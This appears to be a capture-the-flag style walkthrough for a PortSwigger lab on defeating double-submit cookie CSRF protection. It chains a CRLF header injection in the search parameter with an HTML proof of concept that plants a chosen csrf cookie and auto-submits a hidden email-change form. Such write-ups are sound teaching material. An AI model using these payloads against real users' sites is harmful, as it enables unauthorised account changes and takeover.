# Cross-site-request-forgery-CSRF-
Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other.
# PortSwigger Web Security Academy  
## Lab: CSRF where token is duplicated in cookie

### Objective
Solve the lab by forcing a logged-in user (victim) to change their email address without their knowledge using a CSRF attack.

---

### Vulnerability Explanation

The application tries to protect the email change function using **Double Submit Cookie**:
- When you change your email, a `csrf` token is sent in the **Cookie** and also in the **form body**.
- The server compares the two values. If they match, the request is accepted.

However, there is a **CRLF Injection** vulnerability in the search feature. This allows an attacker to inject a new `Set-Cookie` header, overwriting the victim's `csrf` cookie with a known value. This completely bypasses the protection.

---

### Detailed Step-by-Step Solution

**Step 1: Start the Lab**
1. Open the lab link provided by PortSwigger.
2. Click the **Access the lab** button.
3. You will be redirected to the login page.
4. Login with the following credentials:  
   - **Username:** `wiener`  
   - **Password:** `peter`

**Step 2: Understand the Email Change Function**
1. After logging in, click on **My account** in the top menu.
2. Click on the **Update email** button.
3. Enter any email address and click **Update**.
4. In Burp Suite Proxy (Intercept on), capture the POST request to `/my-account/change-email`.
5. Look at the request:
   - There is a `csrf` cookie in the Cookie header.
   - There is a `csrf` parameter in the POST body with the **same value**.
6. This is the double-submit cookie protection.

**Step 3: Discover the CRLF Injection Vulnerability**
1. Go back to the main site and use the search bar (search for anything).
2. Capture the GET request in Burp Proxy.
3. Send this request to **Repeater**.
4. Modify the `search` parameter to the following payload: test%0d%0aSet-Cookie:%20csrf=fake123%3b%20SameSite=None
----
5. Send the request.
6. Check the HTTP response. You should see a new `Set-Cookie` header containing `csrf=fake123`.  
This proves we can force the browser to set any `csrf` cookie we want.
**Step 5: Deliver the Exploit**

Go to the **Exploit server** tab (at the top of the lab).

Paste the PoC code below, click **Store**, then click **Deliver to victim**.

```html
<html>
  <body>
    <form action="https://0a2900ec04b207aa809294e600c7003d.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacked@you.com" />
      <input type="hidden" name="csrf" value="2468101112" />
    </form>

    <script>
      history.pushState('', '', '/');
    </script>

    <img src="https://0a2900ec04b207aa809294e600c7003d.web-security-academy.net/?search=anything%0d%0aSet-Cookie:%20csrf=2468101112%3b%20SameSite=None" 
         onerror="document.forms[0].submit();">
  </body>
</html>
